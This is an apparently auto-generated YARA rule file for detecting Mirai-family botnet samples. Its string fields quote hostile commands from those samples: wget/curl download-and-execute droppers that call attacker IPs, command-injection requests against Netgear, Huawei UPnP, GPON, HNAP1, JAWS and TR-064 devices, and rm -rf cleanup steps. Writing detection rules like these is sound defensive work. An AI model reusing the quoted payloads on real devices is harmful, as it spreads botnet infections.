/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-28
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

rule Mirai_signature__1d06d6e7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_1d06d6e7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d06d6e7860b88457b88256b7ae77bf28ed0f54cb473dd28f1bf05f8b7262673"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s2 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__27732f1d {
   meta:
      description = "_subset_batch - file Mirai(signature)_27732f1d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "27732f1d9364ded49b2fe6f25e04b7e153967816e10d43b1de82e1e5735ddf64"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s5 = "killattk" fullword ascii /* score: '8.00'*/
      $s6 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s7 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s8 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__41392c1b {
   meta:
      description = "_subset_batch - file Mirai(signature)_41392c1b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "41392c1bf92e2822d523489de9eb525bc2a292fae035706148d4c06ebe520d8c"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s2 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
      $s3 = "webserv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__2efcf9d9 {
   meta:
      description = "_subset_batch - file Mirai(signature)_2efcf9d9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2efcf9d9dccc6d9e260ebd73f0274f70becaf9876f23bd06fc9ae61a9ab6e40f"
   strings:
      $s1 = "ropbear" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__2a39f92a {
   meta:
      description = "_subset_batch - file Mirai(signature)_2a39f92a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2a39f92afc74ee5fc809dc2bc52db2a17c56b6e26601add30e6a167c18d8c9a3"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '44.50'*/
      $x2 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope//\" s:encodingStyle=\"http://schemas.xmls" ascii /* score: '44.50'*/
      $x3 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '43.50'*/
      $x4 = "SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://%s:%d/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi" ascii /* score: '38.50'*/
      $x5 = "SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://%s:%d/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi" ascii /* score: '38.50'*/
      $x6 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"" ascii /* score: '37.50'*/
      $x7 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"htt" ascii /* score: '34.00'*/
      $x8 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii /* score: '33.50'*/
      $x9 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii /* score: '33.50'*/
      $x10 = "iption><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://%s:%d/Mo" ascii /* score: '33.50'*/
      $x11 = "ver1>`cd /tmp && rm -rf * && /bin/busybox wget http://%s:%d/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><" ascii /* score: '31.50'*/
      $x12 = "orks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMapp" ascii /* score: '31.00'*/
      $s13 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://%s:%d/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron" fullword ascii /* score: '29.50'*/
      $s14 = " -g %s:%d -l /tmp/huawei -r /Mozi.m;chmod -x huawei;/tmp/huawei huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDow" ascii /* score: '29.50'*/
      $s15 = "GET /shell?cd+/tmp;rm+-rf+*;wget+http://%s:%d/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" fullword ascii /* score: '29.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 900KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__651b9c37 {
   meta:
      description = "_subset_batch - file Mirai(signature)_651b9c37.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "651b9c376d7c39c9aeb368de6fb8b8698e7d73c1cc6cfb3739078e5970f4a7d3"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '43.50'*/
      $x2 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii /* score: '33.50'*/
      $x3 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii /* score: '33.50'*/
      $s4 = " -g %s:%d -l /tmp/huawei -r /Mozi.m;chmod -x huawei;/tmp/huawei huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDow" ascii /* score: '29.50'*/
      $s5 = "User-Agent:*" fullword ascii /* score: '17.00'*/
      $s6 = "Host: %s:37215" fullword ascii /* score: '14.50'*/
      $s7 = "POST /GponForm/diag_" fullword ascii /* score: '13.00'*/
      $s8 = "oAkA#Lks.comj" fullword ascii /* score: '11.00'*/
      $s9 = "&currentsetting.htm=1 HTTP/1.0" fullword ascii /* score: '10.00'*/
      $s10 = "Content-Length: 601" fullword ascii /* score: '9.00'*/
      $s11 = "Host: 127.0" fullword ascii /* score: '9.00'*/
      $s12 = "Hello(W" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 800KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__1fce2e5c {
   meta:
      description = "_subset_batch - file Mirai(signature)_1fce2e5c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1fce2e5ccf649831a8e73657244da464c3b7e1c1dabe9c5d392612187a85e6ae"
   strings:
      $s1 = "/x99/x99/x99/x99/x22/x22/x66/x19/x01/x02/x03/x04/x05/x06/x07/x08/x09/x10/x11/x12/x13/x14/x15/x16/x17/xFU/xZK//x38/xFJ/x93/xID/x9" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__549a0fed {
   meta:
      description = "_subset_batch - file Mirai(signature)_549a0fed.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "549a0fedd5d3413ad6a927dd2100314e74122822646cf89d2a61f598a20739ca"
   strings:
      $s1 = " 6!: <='<#}7*=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'g' */
      $s2 = " 6!: 1<'}4668" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aFh' */
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__31436252 {
   meta:
      description = "_subset_batch - file Mirai(signature)_31436252.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "314362528fc08aebf9ce2185fa5b8c0048bf7e271e69d5c41c72c03a7e6522ed"
   strings:
      $s1 = " POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__4b263d7e {
   meta:
      description = "_subset_batch - file Mirai(signature)_4b263d7e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4b263d7ef39008350c4692d3a0694a4a8fb5a0f2fbbf390369f384caa82ee6a9"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '46.00'*/
      $s2 = "GET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" fullword ascii /* score: '29.00'*/
      $s3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.12.71/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" fullword ascii /* score: '25.00'*/
      $s4 = "User-Agent: Hello, world" fullword ascii /* score: '22.00'*/
      $s5 = "User-Agent: Hello, World" fullword ascii /* score: '22.00'*/
      $s6 = " -g 45.90.12.71 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmo" ascii /* score: '22.00'*/
      $s7 = "d 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Up" ascii /* score: '21.00'*/
      $s8 = "POST /GponForm/diag_Form?style/ HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s9 = "Host: 127.0.0.1:80" fullword ascii /* score: '14.00'*/
      $s10 = " POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__50f7b8b6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_50f7b8b6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "50f7b8b6303f296ec48f49b8bc311115e16d8618636ad12c55259ca5f7c8a396"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s5 = "killattk" fullword ascii /* score: '8.00'*/
      $s6 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s7 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s8 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__57a0c045 {
   meta:
      description = "_subset_batch - file Mirai(signature)_57a0c045.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "57a0c04572b1a1ad1c61aa38d7111c02e74e05c5d1b28d84152150a15f8da297"
   strings:
      $s1 = "f(__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s2 = "Ftbad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
      $s3 = "ropbear" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__1f7ac7ea {
   meta:
      description = "_subset_batch - file Mirai(signature)_1f7ac7ea.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1f7ac7eac67502b75ab542015a67bd0afe6243c9bc4c223826fa9a899aa7057e"
   strings:
      $s1 = "0/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xF" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__1f58bb29 {
   meta:
      description = "_subset_batch - file Mirai(signature)_1f58bb29.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1f58bb299b295777555be9bb90abdbf7247ada138b193c5c007a39d6cc6d7896"
   strings:
      $s1 = "0x000102030405060708091011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__3be2ffe6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_3be2ffe6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3be2ffe6c053c783148bec691e682b2104f910c300b74dec9535cc5f5b40c224"
   strings:
      $s1 = "pk[selfrep] found a faith - %d" fullword ascii /* score: '12.00'*/
      $s2 = "w0x00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__3ccd0fcf {
   meta:
      description = "_subset_batch - file Mirai(signature)_3ccd0fcf.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3ccd0fcffb9b689bc3b53bd0ef2e1c9b619b896f54f3886d3eb69ae64bccd670"
   strings:
      $s1 = "ELFError\":src/floods/packet_build.rs" fullword ascii /* score: '12.00'*/
      $s2 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__45a0a340 {
   meta:
      description = "_subset_batch - file Mirai(signature)_45a0a340.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "45a0a34091e552b724556880dd0fe4e33e3835424ed2c6cdbdd944558ef05576"
   strings:
      $s1 = "pk[selfrep] found a faith - %d" fullword ascii /* score: '12.00'*/
      $s2 = "w0x00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__2ec3483d {
   meta:
      description = "_subset_batch - file Mirai(signature)_2ec3483d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2ec3483dd5a64ada98ae8325d051e3869d541b56c05a9cb11138b46ffeeeb14c"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s5 = "killattk" fullword ascii /* score: '8.00'*/
      $s6 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s7 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s8 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__461028c5 {
   meta:
      description = "_subset_batch - file Mirai(signature)_461028c5.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "461028c51f349cc535b0bc4c6d90341ccf0598f9e117bf14f38b21574fa81fdb"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s5 = "killattk" fullword ascii /* score: '8.00'*/
      $s6 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s7 = "botkill" fullword ascii /* score: '8.00'*/
      $s8 = "/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__4863f247 {
   meta:
      description = "_subset_batch - file Mirai(signature)_4863f247.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4863f247ca20b21777170f1c4ab9f0e43184420ab6d752f1d749caedadc70cd5"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s5 = "killattk" fullword ascii /* score: '8.00'*/
      $s6 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s7 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s8 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__6bb2ddfe {
   meta:
      description = "_subset_batch - file Mirai(signature)_6bb2ddfe.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6bb2ddfe4837b3c856aabd643e2dcc8bfd50f38edef0f12ceb9f49aadc28c522"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "auth.binaries.lol" fullword ascii /* score: '16.00'*/
      $s4 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s5 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s6 = "killattk" fullword ascii /* score: '8.00'*/
      $s7 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s8 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s9 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__443e88e9 {
   meta:
      description = "_subset_batch - file Mirai(signature)_443e88e9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "443e88e9581260c3d786ac55fc1349c930804e7f2e01c509517e77835026aeec"
   strings:
      $s1 = "/x99/x99/x99/x99/x22/x22/x66/x19/x01/x02/x03/x04/x05/x06/x07/x08/x09/x10/x11/x12/x13/x14/x15/x16/x17/xFU/xZK//x38/xFJ/x93/xID/x9" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__6c5854df {
   meta:
      description = "_subset_batch - file Mirai(signature)_6c5854df.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6c5854dfc6863e090a35f007e385b7963fbf80f04e0760318c64affb43128da5"
   strings:
      $s1 = "/x99/x99/x99/x99/x22/x22/x66/x19/x01/x02/x03/x04/x05/x06/x07/x08/x09/x10/x11/x12/x13/x14/x15/x16/x17/xFU/xZK//x38/xFJ/x93/xID/x9" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__20267b58 {
   meta:
      description = "_subset_batch - file Mirai(signature)_20267b58.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "20267b5829c69e1b3e41c0e7920c9542126bbcca98dd42937e5c23d1ce071650"
   strings:
      $s1 = "wget http://64.188.8.180/x86; chmod 777 x86; ./x86 iot.x86" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://64.188.8.180/mips; chmod 777 mips; ./mips iot.mips" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://64.188.8.180/arm7; chmod 777 arm7; ./arm7 iot.arm7" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://64.188.8.180/mpsl; chmod 777 mpsl; ./mpsl iot.mpsl" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

rule Mirai_signature__23f4101e {
   meta:
      description = "_subset_batch - file Mirai(signature)_23f4101e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "23f4101ea2739ed6e18f7c5ec1fba7493313a8ec7581ab6ceba399a07f39d683"
   strings:
      $s1 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/busybox wget http://%s/mips; " ascii /* score: '25.00'*/
      $s2 = "cd /tmp || cd /var || cd /dev/shm;wget http://%s/telnet.sh; curl -O http://%s/telnet.sh; chmod 777 telnet.sh; sh telnet.sh; " fullword ascii /* score: '25.00'*/
      $s3 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/busybox wget http://%s/mips; " ascii /* score: '25.00'*/
      $s4 = "[0mPassword: " fullword ascii /* score: '16.00'*/
      $s5 = "HEAD / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s6 = "[0mNo shell available" fullword ascii /* score: '12.00'*/
      $s7 = "POST / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s8 = "[0mWrong password!" fullword ascii /* score: '12.00'*/
      $s9 = "!shellcmd " fullword ascii /* score: '12.00'*/
      $s10 = "login:" fullword ascii /* score: '12.00'*/
      $s11 = "Login:" fullword ascii /* score: '12.00'*/
      $s12 = "/command/" fullword ascii /* score: '12.00'*/
      $s13 = "/proc/%s/comm" fullword ascii /* score: '10.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110" fullword ascii /* score: '9.00'*/
      $s15 = "!openshell" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      8 of them
}

rule Mirai_signature__23817060 {
   meta:
      description = "_subset_batch - file Mirai(signature)_23817060.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2381706048d850c08b3db17ec87a2e8fbfd58db8655015b553c0a5488f5a038c"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.ppc; curl -O http://176.46.152." ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.arm; curl -O http://176.46.152." ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.arc; curl -O http://176.46.152." ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.arm; curl -O http://176.46.152." ascii /* score: '29.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.ppc; curl -O http://176.46.152." ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.arc; curl -O http://176.46.152." ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.x86_64; curl -O http://176.46.1" ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.m68k; curl -O http://176.46.152" ascii /* score: '27.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.arm6; curl -O http://176.46.152" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.sparc; curl -O http://176.46.15" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.mpsl; curl -O http://176.46.152" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.arm7; curl -O http://176.46.152" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.mips; curl -O http://176.46.152" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.i686; curl -O http://176.46.152" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.x86; curl -O http://176.46.152." ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x230a and filesize < 8KB and
      8 of them
}

rule Mirai_signature__24af424a {
   meta:
      description = "_subset_batch - file Mirai(signature)_24af424a.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "24af424af9dd319bf065789da9991b0848607ea35e94ee4575ea8c56c6e150b4"
   strings:
      $s1 = "cd /tmp; wget http://94.154.35.154/mipsel.urbotnetisass; curl -O http://94.154.35.154/mipsel.urbotnetisass; chmod 777 mipsel.urb" ascii /* score: '30.00'*/
      $s2 = "cd /tmp; wget http://94.154.35.154/arm7.urbotnetisass; curl -O http://94.154.35.154/arm7.urbotnetisass; chmod 777 arm7.urbotneti" ascii /* score: '27.00'*/
      $s3 = "cd /tmp; wget http://94.154.35.154/mips.urbotnetisass; curl -O http://94.154.35.154/mips.urbotnetisass; chmod 777 mips.urbotneti" ascii /* score: '27.00'*/
      $s4 = "cd /tmp; wget http://94.154.35.154/sh4.urbotnetisass; curl -O http://94.154.35.154/sh4.urbotnetisass; chmod 777 sh4.urbotnetisas" ascii /* score: '27.00'*/
      $s5 = "cd /tmp; wget http://94.154.35.154/powerpc.urbotnetisass; curl -O http://94.154.35.154/powerpc.urbotnetisass; chmod 777 powerpc." ascii /* score: '27.00'*/
